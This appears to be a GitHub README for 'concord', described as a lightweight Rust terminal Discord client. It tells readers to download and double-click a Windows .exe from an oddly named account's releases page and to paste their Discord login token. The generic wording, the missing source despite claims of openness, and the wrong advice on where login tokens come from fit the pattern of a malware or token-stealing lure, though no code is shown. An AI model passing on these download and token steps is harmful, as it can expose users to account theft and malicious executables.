# 💬 concord - Simple chat client for your terminal

[![](https://img.shields.io/badge/Download-Concord-blue.svg)](https://github.com/Coloured-leadbank877/concord)

Concord brings your Discord chats into your terminal. It keeps your interface clean and light. You use text commands to navigate your servers and messages. This tool works on Windows and uses very little memory. If you enjoy text-based interfaces, this app offers a fast way to stay connected.

## 📥 How to download

You can find the latest version of the app on GitHub. 

[Click here to visit the download page](https://github.com/Coloured-leadbank877/concord)

Follow these steps to set up the app:

1. Visit the link provided above.
2. Look for the "Releases" section on the right side of the page.
3. Click on the version labeled "Latest".
4. Choose the file that ends in .exe for your Windows system.
5. Save the file to your computer.
6. Double-click the file to start the installation process.

## 🛠 System requirements

Your computer needs to meet these basic standards to run concord:

* Windows 10 or Windows 11.
* A stable internet connection.
* At least 50 MB of free disk space.
* A terminal window like Windows Terminal or Command Prompt.

## 🚀 Setting up the application

Once you finish the download, you must open the app. The first time you run it, the software creates a small folder for your preferences. 

1. Open your Windows Terminal or search for "Command Prompt" in the start menu.
2. Type the name of the file you downloaded and press Enter.
3. The app will ask for your Discord login token. 
4. Paste your token when prompted.
5. Press the Enter key to sign in.

## ⌨️ How to use the interface

The app uses a text interface. You do not use your mouse to click buttons. Instead, you use your keyboard keys.

* **Arrow Keys:** Move between channels and servers.
* **Enter:** Open a selected channel.
* **Esc:** Return to the previous menu.
* **Tab:** Switch between the message list and the server list.
* **Ctrl + C:** Close the application.

## ⚙️ Customizing your experience

You can change how the app looks by editing the settings file. Look for a file named config.toml in the folder where you installed the app. You can open this file with Notepad.

* Change colors: Look for the [theme] section to adjust text colors.
* Change font size: Adjust the settings in your terminal app to change the size of the text.
* Hide channels: You can list muted channels in the config file to keep your view clean.

## 🛡 Security and privacy

The app stores your login token on your local machine. It does not send your personal data to other servers. The code is open for anyone to inspect. This ensures the app performs only the tasks described. You should keep your token secret and never share it with others. 

## ❓ Troubleshooting common issues

If the app fails to start, check the following items:

* **Missing path:** Make sure you are in the correct folder when you open the terminal.
* **Token issues:** If the app cannot connect, your token might have expired. Generate a new token through your Discord developer portal and update the config file.
* **Text display:** If the text looks strange, ensure your terminal uses a font that supports special box-drawing characters. Most modern versions of Windows Terminal handle this automatically.
* **Firewall blocks:** Windows might ask for permission to let the app reach the internet. Click "Allow" so the app can sync your messages.

## 💡 Tips for new users

You can move through messages faster by using the Page Up and Page Down keys. This helps when you have many unread messages. Use the "Status" command to see who is online before you send a message. The app saves your scroll position, so you can leave a channel and return to exactly where you stopped reading. 

## 📝 About the project

This app relies on the Rust programming language. Rust makes the application memory-safe and fast. By using the terminal for communication, you remove the heavy load that standard browser-based apps place on your hardware. This client focuses on speed and utility. It ignores bloat and focuses on the most important task: reading and sending messages. Use this tool if you want to save system resources while you chat.